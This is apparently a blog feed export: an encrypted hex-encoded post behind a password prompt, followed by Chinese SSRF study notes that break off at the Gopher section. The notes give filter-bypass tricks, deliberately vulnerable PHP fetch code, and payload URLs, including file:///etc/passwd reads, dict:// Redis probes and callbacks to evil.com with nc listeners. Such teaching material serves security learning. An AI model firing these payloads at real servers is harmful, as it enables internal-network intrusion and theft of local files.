1a284527b17a2efd2a8b3e07efc59a8ccca6921ad7db295d57e8d6a725d9ce3b50cf2ab1fe5b39c290dc166abe5caaef80842eb27ff71d2c53f4d4019aa9f5b84503fe1da4239ff56c94704b6f26aa02b772a72c73c457b0f22978e06831a95c04a6a374a9951f38c93729982a5a2172f9d882cf9f35ff04bf0db9a4808fd787d4128dbeaebd50ff6dd2edbf2863914a8048e045ae3c4a8b7296178a97bf7439afcda08e86eb4a02c5727fb3ab01ad8022d401784ccda1b19f87766763a080b2428df91b1ace615e202d4500d381638eeca2a194866d5d4277ab727aaefa762b32100cfcf1eb18cf1cdb2d62d0032932903758a03556d9329b385003b1a68294666f86e794f634c7cfcfe5c0c63309809201079c81a1555069f34f9c59fd9853caadff78e14d73684477fdc4e16d9fa3967bb7f75cf44b51503b8aa323fb7cdee1f8792a267d6939b86658e369fa1731a58b37f8f2b31005222549e2631d385cf6f5d7996a8a4e6dc6d73d0ed3d5e0def7284ff1633f32673ce38bb3d71aa14fc51cbc5d601e5f45fed6e3a11badb5377725b53af6a71deaaf3bedf211d1359d3895db5cdf53d9843e5ef39aed8cbc7acc6412355f8078a66429f067524225701175440bb2e57e8f74256edc00b3e404c78821e8397885f22bfb5b4a914300721c6c71050a3265a1980a951e579be7dada961cf3def253153a769751c9fd98356d2edf91cbc9eeb4334f31413676efe7cc14cfcf359a79d921e65e84c814e7f3d13ff05ee5959f4ae909e2082a5c69fc8d15d448bc3377855a655c88085d0091e3ee709233bf2f4971d72d3e3459866dd1aa129ca073fd488423ebe177ef84bff23e420786319d52dd507c92c36a5d90e25d5ad6fb5bbb3925d90eb9a44d843a5cd42ae4ac9273d7f1090133e4dd88704f3c8b14df46ac7dda5a702c67ce81ac58c4b2887566c90f9e22be630180ed7a48aec2bb1ab6c5b4d3d7fbfd0b0444227372c003854dbffe82745b73b42701960cbf3c65d00359e8ebe824d094bbb9d11db650fb280c2ead6bac941571571921b41ebadfe73b64468ba14f299a63c37df9a3a0e3679e7940201c00b610bce8d5fce097daaf53ad4a5bd012c9ec91a1cf0b8de39c84774728fb2e4935dcc66c13f53c85856cb88e2059c7f2bdc45d646b3354801ae202069c76f155849b17b31b6379deb898f5696f35f5575ea25773bb41febeca3c6afffff17ce8110b52375ad20ec5d787a0b6b945b8e740b0bb0912df45b740b93302163139f6c8a9ede3db667f0f14bf51e5d8ae03cfe23a3c086ab5b2c20e5a2b38e31396ab92712a5730ec7b271679ba241e254752c948bcd9b33b16368a1bbb6662671038299bfeb6876ee72a25e8c184f373c2d8bc0e1238df5526f7c80958b3a03044864325701b93c024eb69f19aca7c514a0d197bf53c40168f63bf91ba43dfa57643b16e95b78b788b7bf4c2ec2efe67582e886341c6ea5c5bb58575500ea8b4494c3976c27b7a586e339dfe6e541308645bfe742824a88f26b99e9737057068d42d5114c7a979aa878e909b5a40b30f4826f3ea68dd5a5acb96defb5e118634f172a54dd94838f3cb81d019f679f6121485ddf661430646d89ad46c0b33caa1970cf72824996299149136c3e112ef17e73d1eb0711201c012e285cd2d1250e1604365dd8ed4dc39d5f28825f15f18625c8b50935701066c27a47464a533807c9b6c149fbfab0f999fb558d8703d139af95022c797ffafbda92c6deda3aba3b14c0b3f2e43ee00c4269db1c478d03e804474e50247c8c7cf137508a1030b3ff87e0a0c0e994c430865d7f8fd8269625a778c8c4cd56a91a13016ad74154321b7afe10e7f1f445d539ba20e2f18b089884fd3147b0683cdc248b137daeb0849a8131592a9df44ae0ec5ac2dd351332b87de8f4dcffaa80030f4cc674a408a89d84743ba48ec7cd471bf6d876f2db5360f3feb35956a1e9b32cd7296892d71d7a37838b32131640b00fdc571e0ad0722e1889e0233a20bb3f55ebf81632dbaf4ed5b837aebda9fb4d5cc1c0d844157ef488a387b10e554774b1004ec78cb85d1424e96bd3e58516042d7213ee1ad31cbcf75bd24e1c2f2e6245d0ba7ea6829d48c04c06619b595be3bc3d6af7fc8c335f7063ede5cc6021675f957d2a347a546bd73c612dc6dfd0197c03c9fcee3b5f4efb1815b203cbeb1a58f85e2cc0bc4c9053aaf3aabc0fe5eb08ad17d9e8bcb36099cecab6069b6a42c208e63d7071af29d19c7f213f1b0051207f2e0357d4a951068fef9bae3ed09525a50c42a92ddccbcab9229389d93423371457dabb48490e936715c89c060f36d54f9c7b91f00b1436b3cc5fb6fef3260f2119b10244021fe5a85c8b423ff2ed62fabc2be1b7292599be0b86ab08591243ffa55555e7bdee02dea2d0645ee7f7de12482714b13fa6c601d63db4ebb6177f20208aebef58321d6ced8e7c7207973294b6e14ab6ce74b173747ef36a654f710e1b7f5be2d1d66c43dbc8a5dffe121b5a1b9b365610ddb062e58b60646db9fd3f2dfd9335e78b360b83ed1be33211f500ff889d17e6e82f37b34d3c2ed2dbb8bf7a0a371b4630afc10195a8efe1e88f53d390d86f3757c327d0ff03ec01d99eb94a2cb9ef280503d98cb8c8033a301775ff61eb4a64258352ba168953816178c8392f79f277ed1b9326f7346eb495da718c1679975604b529bca98045f4375b7878d825cdd8ec1f558a49a163449347f59e09c002bd865abb124d0009a613e5af5d19343866f830c7d722626a3287cffdfb0b2bf13495aee4f532e56407b11a2a4891f1d8b27c617a95e251a4adb7ff46e8bc9958511cd043720e114757d16e38c3a9179856dd0902c2dd088a45a844a390816944282fbbb10a60652829ce15ed9c2efb42b61fbffcdd3241a1f0317a923b0d20e755e04b658e59284bae9d90341d63e9a589f5b838646e651aaa46e779eab5d83ce97c52f32cc5f27e9899dc2e174f1bf9941a6036e8dba6af6ae815b3afda53662ff3f1b46cea8e9c00f6e503926eb4d8d62285e50c9b5ecf513f1caf43cfef49e782f1638e63b2419441815ec82d2e087ef7e911dfe4e952117d3170acc029a039d8756caf729ca4d0cd3e913d1c59724cc24e100fe48981c637d9f499202da96a09f814d5035e0e26a32cb7db1dad1ca0f87e0f655690e5be81d4157c004b7db15695bacc7a0de5a98904373bc90a920681b1a37f4799eae389cdd292b387cf8a12cd34b4fa21d4001814751b476feae10cb550bb28f0ad308001cfee8052bbc5b26a4d4972f20f1901b14f8233b608bd5633b39086b7bbe380307df5a14194d2f872ac9e3baf5ac020465eab00e2a34d54afe7857b2adbe4363c932ca4644f642f6ad0b2f2f2d34e34969f4257bd6b0454b6e63a91767e71b78784c8bc2ee374003d644169f3a04e08ea9018f725ec3c54de2d3f40742ce7d9874afc634868b07ee6a10db669c2785b82f7c46fe77143251d7ab56747462d58f1c011a594b2bb5e614405f04bfab54d6758f47571d66d85e674a9d2b3d1510c535c71325cbde26772c6d2a8fff7d9444d2005a2db374c944e5c926a49aed949036232f93ddcbe0eb64d9f74b5e0a547f13ac6e7ffdff40eb2a76453e8580c782454cd8ef8e7204ee71a79b5b7136b1eb93674520e94caf9af9d207ede7e4cbdd68588e94efe7125bf5bed191f5246448f542a3fa756e61988cee8d1689f386c4a25f69f21d2abef5c59a4e0ab89ae084497acfc94bc962111f2966608bb77be574e95d6ca107761a69b89b2f27f2fb48dc69791e137d810d3e489670b79d504a73d8d0aaa552b26423e61fd7df9e93f069ad416afb387b80177a93f0944330250867bc4e548eef3468160b608a515206e63d2d54e5099a887140f9ec4cc8afa8790e3724c96051310f38818bd8d3afc060d8540829f89c01d4b14a33037a4103c637d7e4a037f9de41d3188a8f7d5bdbbcdb6d0f7ec1cb2baad9df27231c4ec2ef98b7b06ffe843d2223261ba521c705522a07678fac99e31e95f6d778c76bb9a51d8cb4310220f81e2b2df484270b390e7f52d3bf08671a099677557dd71056b598aa0b9ef19e77750b7fc8ba1356d1a046669c4886c46b178103441a153dae5b07588d33cc4176ce7cc7c1eec8d49908f3cb58aec45e4774e569d7f920a5aef04a58e76fb9abb6de7a0a0f54ce54f351a7ed44abc71785ca09f6eb11b9a51a4d539dc0cab1f1de2ca00309959b520bcf11a88ee42a05fe6602bd67b71f037aa4aca75390817acceea6c9acdaf00cfcccf569b017434d5ef4b33ce6b509fd3b4507ed626976464b1450d88d991df1d52c99c9056b3c792690e0964fc40f43661332946e6639a4b30affbad8c68aa3640f5ba7c4415f59bfa82a660c1b99fc1a6e86f79f53582d587ebf0501bfbf433762394804fc53592f4185b8d93c2e39a0cacb6da1ece7ab123af33c8443bb432f371e4027dfdc7c9aa37b850b8803e202216269c8565d3f3dcb355844a21b2f16bfc2cf46c534ef349b7a3ae40a8f9978dfcb7b41c6c98f922ea07406307d35d79f65707b4d057f19cbabbcebd730fe18cefb5d53852d82155ee270cc0af37bb82b429adc99c8f64752a940956ddcf2271b16425b41db7e775952cdee4b623e1b665e6fe1df338d9d6353d71d605240fc9900b5559af16b958814bd9051d9bfc7b24025712dfe4d13c2adc125a8a67bc297b8e8c26072b75d98c98206a4517bc9a389b328e82f2e40a2d5eafb4aa544f16f986ea8b142eeebc40b358453caeaa2f31b639adeb006526a3d6026c69dee96d42b66c6878b42009b0c3a8afc58312cd5e1e2cf1173f5d04140af8aee9f8e079c2f8138decce1b2b9539acd732d5faa751fc4eb048d324f5e9c6399cb5aa3aaf4ecdc4c0835b7e7871cd16100ba1772b89a424a0e47b177cdb651de78d664d5ffc96ff9091b3b77e9fd8fc186b14a1c1b390c8e9541d33d660470790746d9823b2bd3da39ac5a99cb340c182778c6a51166c9d43554091fe08ec53c5e87cac0ceb97e5ce3c2a52ede79368cce1ecf993c110da408ed9ea5ae6e20661ceb953d3825823b091d074010c22bc9d94e6e6dd2b410aedb39a778bf5ed75e8fab3dd302651439e61bb6ba60c165238c86178185d14f038911e451aa8411a6f6de1bd864e1206e49bd9c9552fae539d4c74a8c1f85e53d2c9093ee7485e5b04d39033612d68e809e7e8c8527974f0e6251b478b457e1f2304b9ac04c16e5231b976a508a827b97ab6e7d2393db8c3264484406d7960041fe6d9c3b6d76ca870b8c528683d89f13ad46ef97e18b103adf7135868b67c493f3dbe5f87affd4463a4967f2f554fc6ee97a7d8773eab4f49749dd5e88185a888f89110aae00121d37aadba5264ec263dbc0ef2486f25b8ff4853a76059f8b2fbc0c874688ce42c9c0a9d92a91bcaeac20cf7e0f349f3814be1f64f499c23f00b5db9cf65f67d669c72ac8a07add643ad6390f63b7f184bd2b9f4207f8480dd390653508aa2369d2b1885bf7f20a8feede67932f1de61bacd7b6428aa9bb2fc6cf2ea05488a0fb18231653b86b29a390f0aca0a8c7a8c49b0866d38fea7fd9844ea4eaa6df538ad23519d8f0e73bfec6e248e807a2e73a3ddfbeefc2be05e1f2b46ded6bdc787352f7592eb30f901c96e7dd1bca4f97ea02f1aafea16db062f157546511f08bd9d651b27c0cb80967381d7c5e1c9521784af871a23686b09004819e04a9587f7c4b2ea4568f31e52a26bee4241a0a76227b72f826e4b31bae5b9a23734c9b9abf1735e68e8fdecd20f72af5bf67b4d939369e8ea9582baf8470502051ad45b51bf53f0c634b1a1f1de3cfe1424f527dc081d0d906abb39e0d9c3deebdc8737072c84a85ad3dcf7885825603f84b65f5f836c7915a7c4011eb1427f4616eb3f315e24522fd464f51c5d539ea4b8bb1cdbf181c7aca9dedbf5fbd29b7895c429cb0d8019e97195e4d482dca01ae9eb1cbb84d823104e4b8fcc8bb8b347acdc1a4c6baaf1fdb81618f086075918bd87775bf32f6007eee3c77465ad88b42b1848eef7e1c5f7e3970e16ffd2000f5760cb44367c57ed83060b3ba16f797c7bb5c2922a2e38c91d11636b3a3560bd267c0f96904643370f91241345074107a42a73a162b966fbcf4d4e82d8df9312da385b8e57316231ffc3d0bb8cc55364445f61a1fec147b4cba8d8391075b17dad0b9ec346ca9aa4bd316b59afdbad8eb15f28013576561c9538f0fe70866a3adfa28cddd4714e19489a960bed8b0a4fe03462182188f9de7ef6208198a8347e3298a9d17c34a9394eb1974701fe5ffd404e39ceca733dfe9392eb08bbde22446f57d86de07ddc4e5223587c5d22a427c513098ba4b6b1e73e333b93eeecd2eb017e0d64a28e13bdc731123061be8c8db8a85db776ad6cf4b17e8d58a341bf608775a7ffb952df8921593fc21e1fe2cb9a992ac7ebaec8d4f052cbec268fea4eb41fbf86ab026e8c6344fce2a21589eaae70d1bf8bfe13e2b95fcf68544bd254e10f178a2a671fe64423199ef258ffae29ec4f91d018a2717bbd87efce2e518d7eba5083d33884d58c976a9e329e5f661c28cd3531de78467f28182a5b1cd897b9628055c09b5374f18b7ccdac6f3ef9db92096ac884a07ed5b9a0b86be7d541a1a60595c3c4aef1d6f6ba123e2b7d7ce6098ab0ba7fc3beafea7e26d26e942400702965921ecad6be072674d023f8aa6b059019aace39b7cf5fbcfe9861685a3d88369389385c1c09bd62d0b9f4258471f2c6ffe66eb6990316946c20b5ad1c0b88375173f06ca64735bfd189cc62a35c911e8b571e175d974b336bf86a532267772233f1833c722bf9a841712c40c5bb30bb855c50379b6ab26080d5153664ec2e9b9bb29a7663fc66cabd57e57fff84812d2130b5a5f29fec54441463c220a369ff8c22da075b89b7ca35ff9dbb7a725c20323853493c67187e5eb6bfaed16abe41c020fda3cdea07211c85901ee3e386937884a219878e1284e54c0c1a98b5d9d4eea7a7a0531612878e7b5471f73b50d3c4c0f4de8890b3a90a226a7ae4fd8f654b91e61939e44e27391ace859ea6bad584d2df9955037a12b99667a9d4f6555fe808f6f2c3d322ccc3123b222f0249d05f91e3659e5150c7d34ecc90ed29009d901deaa0689ea86914c0022f6390d2fefe730e8dc8abb3d96cd7a420b4f9b6f52fa64157e446511383f1e0d29faa3e71c59c80ed5654ea951c58c33a15627c7a63af1c97c6f3762f7b5062972adb9e2bcc72f66fa98fe96d27f8e40590285662fed56c3feac9419aabc803c21e56a7123960b0cdb11e76e68a9f36b1882759bfc1e4ab714c83a1002e71fad6d8e6c48f6bb8f7216c41941d020a7a67e50a56ddbee801ab581be6551ea36d8dc6b1a3a01a454d09bf155069df3f083e5d616a8becfa2f23600e4793b2b33269a72aedb65fa9e03d9509d3bc96104f54cca89ed43a1133f6a31a115e831cffcd63f8bc24d0b1005824b584ee2644cdcfbff13a8ad30ed9349de0f46fc09d3fa17b64f1ecf175003104f65ec8e758e8b99bd4ea0e9b395d755c0a20a8ac5048d56db21be794e79a51026191e3b09412939355760f4d879b9b558c51f9fe7ebbb4b58faa99646f416f84beafc1f9ac86f8893c0994d271974835bd79161b3af22e99982d46719c3ddb256f0558995191dd6b881bd64ed0d73c17aed3bfba4ca40877db59348c93d1b65ccff52545ffad906ffbb61e91125b7ce4c2c6469cdb928442fa9e51981f73878cbd5d45b86028f80b2a496a7372bf972cbee6b454d712bf984440d2fe53e5df3274093563afd5e7d500c4e5f2d135559ea4f9a572e2805c4d260d1f9189b8f14944d59b860c02f3e297c608ebf8af8dde077baf90e4bfa4af777d2d7d80d84e1513905c74993cf7d9091fd4639f4e097d47576476b075f7818a3cd9b414c1090d8aab094947e5c8f227423fe807a1d950be11cf03245a9858365193dd6d2479527923be4adc70e7833c49e4c0e8679a174233a5632a794cdb0bdd35158de78a47c62afbbfe4f5e851206327f859e6a17d6c088b75cc925ae102c1fc1bba79b0e0f93cabd3b2348d901096a9053fe7078a13f48d1952a0a4abb36b29c6880988c86641441799ebe5b568fd200724d6a8c746a1cecfbaef7c987694e404c87283c63a6de6b4a90d44947dcd5aeab9a990147b49cf2c1562c86cd7607dbebeee33bb50a0804decab00bd71d4c0d0dbf852407593fa9c43c9cea663a4b5eff1c2f3d311aba289d7f6c90f433217b47e1231379aa1faf109f87b45988dc0383c5df94320f4e99b0bb0808f1c04029dec3bc7463656bb336a5072b85e29527ae7db71e7601a1b69c027b652923a9e275247f4e13118d8e7172c5b825017b66dac074577efee1f69de99f7c96708909eb38de57a32bdbbdc458e1973daa05a21fb56ea4f440a903911dce453d6f7443015f6117064782185257e223d28e48de1518a9b514c0d95892618b360757c98470391a3889717604d7916c3d29a11c20c738c4dc326d916edc12bb300958bd06edb5778af5bb80e0eca04668a489bdeb47994ac08b923762413debbfb4460b7c623dbde9fc25e222f076329d89c0531077441caefaf15885dcfb06b3bddc1ad47a37c1007e197c5e75bcaaf47e8021d067ff24ba25d5f4ed9ffc56b919568faf7a6f98ee24b3c12ef6bd29a5927dc79d33088c37052c41d97edae8abaeeb19676d9e96e8518631231d9f5603ad12fb4fa90f80add01718e7b75d5c19a6e391819a20d5c10d2b663fdd03dd7d923a0765d1b946e126f86784b3d8e2242a4888c518c409342ee158f8edb32eed30843a7db0c13d669b63ab0765246b339a0dda4d2f3baf8eebfb469795c46bec27a3b80f247fa925ff722942c92b3e506711835660c2852f6bd65b91cd635bbfdba0604f43140e4513f8d60d17e31633a394f8ba459b16ea7edbf1e3d5dfd19db1466cf1a36c2204cf3da3cd9f9a7c43f751a13e41b2ad9f288efcfe5d0cf4cc64e2eac3ee0e46887e7db81e9eeeae828937fbca676c7f9918eeed8c72010cc017dc65eae38b5d7072cce1a9e487f12319e4dcd0e417051024c7a6c43115b634ece7f51451ce9f37dbdfe199416e574fa12fff1a0fca1b3168881734bfa
  
    
      
      
        请输入密码
      
    
  

]]></content>
  </entry>
  <entry>
    <title>ssrf学习</title>
    <url>/2024/03/19/ssrf%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[SSRF（Server Side Request Forgery服务端请求伪造），是一种由攻击者构造但是由服务端发起请求的一个安全漏洞。SSRF的攻击目标一般是从外网无法访问的内部服务器。
SSRF漏洞的原理
SSRF漏洞原理
（1）攻击者可以通过公网访问到某个web服务器；
（2）但是攻击者是无法通过公网访问到内网的其他设备或者办公区域；
（3）这时候如果想进行内网探测，web服务器同时存在SSRF漏洞，就能以web服务器作为跳板，进而攻击其他服务器或区域


SSRF利用的条件：
（1）web服务器存在SSRF漏洞；
（2）web服务器有访问本地或远程服务器的权限；

SSRF存在的位置：一般是web服务器提供了从其他服务器获取数据的功能。
（1） 分享功能：通过URL地址分享文章等，例如如下地址：
http://share.xxx.com/index.php?url=http://www.xxx.com

通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。
（2）图片加载&#x2F;下载：通过URL地址加载或下载图片：
http://image.xxx.com/image.php?image=http://www.xxx.com

图片加载存在于很多的编辑器中，编辑器上传图片处加载设定好的远程服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。
（3）图片&#x2F;文章收藏功能：
http://title.xxx.com/title?title=http://title.xxx.com/xxx

例如 title参数是文章的标题地址，代表了一个文章的地址链接，如果收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。
（4）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。
（5）在线翻译：给网址翻译对应网页的内容。
（6）邮件系统：比如接收邮件服务器地址。
（7）利用参数中的关键字查找：
关键字：
share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...

总的来说，需要从远程服务器请求资源的网站都有可能存在SSRF漏洞

SSRF的挖掘，看URL是否有关键字“XX=”
Share、wap、url、link、src、source、target、u、3g、display、 sourceURL、imageURL、domain

5.漏洞验证:
因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞。
在页面源码中查找访问的资源地址，如果该资源地址类型为http://www.xxx.com/a.php?image=地址就可能存在SSRF漏洞。


回环地址127.0.0.0&#x2F;8 网络范围: 127.0.0.1 是环回地址（loopback address），用于本地机器的网络测试和通信。实际上，整个 127.0.0.0&#x2F;8 的 IP 范围（即从 127.0.0.0 到 127.255.255.255）都被保留用于环回功能。这意味着，所有 127.x.x.x 的地址都指向本地机器。
默认网关的简化: 在 IP 地址表示中，省略末尾的零并保留最后的部分是一种简化形式。例如，127.1 实际上是 127.0.0.1 的简写，系统会自动补全缺失的部分。因此，127.1 等同于 127.0.0.1。
内部路由机制: 当系统处理 127.x.x.x 地址时，它知道这些地址是保留给本地回环使用的，而不需要通过任何外部网络路由。因此，127.1 和 127.0.0.1 都会被识别为指向本地机器的地址。
绕过方法部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：
1、绕过限制为某种域名：（1）利用@，当网站限制只能访问 http://www.xxx.com类型的域名时，可以采用http基本身份认证的方式绕过，如：http://www.xxx.com@www.xxc.com
在对@解析域名中，不同的处理函数存在处理差异，例如：
http://www.aaa.com@www.bbb.com@www.ccc.com

在PHP的parse_url中会识别 www.ccc.com，而libcurl则识别为 www.bbb.com。
2、绕过限制请求IP不为内网地址：（1）采用短网址绕过：比如百度短地址https://dwz.cn/
（2）利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 127.0.0.1.xip.io，可以解析为127.0.0.1
（3）采用进制转换，127.0.0.1 八进制：0177.0.0.1；十六进制：0x7f.0.0.1；十进制：2130706433
（4）利用[::]，可以利用[::]来绕过localhost，比如：http://[::]:80/ 会解析为 http://127.0.0.1
（5）添加端口号，http://127.0.0.1:8080
（6）利用句号，127。0。0。1 会解析为 127.0.0.1
（7）采用跳转：常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
（8）CRLF 编码绕过

%0d-&gt;0x0d-&gt;\r回车%0a-&gt;0x0a-&gt;\n换行进行HTTP头部注入

example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 

（9）利用封闭的字母数字
利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]List:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

3、限制请求只为http协议：（1）采用跳转：常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
（2）采用短地址
DNS Rebinding一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。
但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。
要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
对于获得的IP进行判断，发现为非黑名单IP，则通过验证
服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
由于已经绕过验证，所以服务器端返回访问内网资源的结果。

利用IPv6有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1 或IPv6的内网域名来绕过过滤，与IPv4的回环地址 127.0.0.1 类似
curl http://[::1]/

漏洞利用产生漏洞的函数：根据后台使用的函数的不同，相应的影响和利用方法也不一样，PHP中下面函数的使用不当会导致SSRF:
file_get_contents()fsockopen()curl_exec()       

file_get_contents()
这个函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法。
比如：下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。
&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; &#125; echo $img; ?&gt;

sockopen()
使用fsockopen函数实现获取用户制定url的数据（文件或者html)
以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。
&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt;

curl_exec()
该函数可以执行给定的curl会话
cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。
&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123;$link = $_POST[&#x27;url&#x27;];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;file_put_contents($filename, $result); echo $result;&#125;?&gt;


注意事项
注意事项
一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents() file_get_contents支持php://input协议

url伪协议ctfhub伪协议读取文件(file:&#x2F;&#x2F;)这种URL Schema可以尝试从文件系统中获取文件：
http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini

如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：
ctfhub-端口扫描(dict:&#x2F;&#x2F;)dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息协议格式：dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;一般用dict://&lt;host&gt;:&lt;port&gt;/info 探测端口应用信息
举个栗子:
dict://127.0.0.1:6379 //探测redis是否存活dict://127.0.0.1:6379/info //探测端口应用信息

利用bp中的爆破模块进行端口爆破

得到长度明显与其他不一样的端口号，访问，得到flag

sftp:&#x2F;&#x2F;在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。
Copyhttp://example.com/ssrf.php?url=sftp://evil.com:1337/ evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2

ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。
Copyhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit

tftp:&#x2F;&#x2F;TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
Copyhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET evil.com:# nc -lvup 1337Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3

Gopher协议初步使用Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；

gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

对于使用Gopher协议的条件：
Gopher协议格式：
URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流


gopher的默认端口是70
如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码

Gopher发送请求HTTP GET请求：
（可以在xshell里面开两个会话）
